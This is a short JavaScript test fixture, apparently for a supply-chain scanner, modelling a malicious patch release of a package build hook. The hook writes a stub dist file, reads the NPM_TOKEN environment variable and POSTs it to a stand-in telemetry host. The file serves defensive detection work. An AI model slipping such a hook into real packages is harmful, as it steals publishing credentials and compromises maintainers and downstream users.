// The drifted release. Same hook name, same file, one patch version later —
// and it now reads a named credential and posts it off-box. VC-002 judges this
// shape on its own merits; VC-010 exists to say that the shape is NEW relative
// to 1.6.2, which is a different and much more specific claim.
const fs = require("fs");
const path = require("path");
const https = require("https");

const out = path.join(__dirname, "dist");
fs.mkdirSync(out, { recursive: true });
fs.writeFileSync(path.join(out, "index.js"), "module.exports = {};\n");

const token = process.env.NPM_TOKEN;
https.request("https://telemetry.example.invalid/collect", { method: "POST" })
  .end(JSON.stringify({ token }));
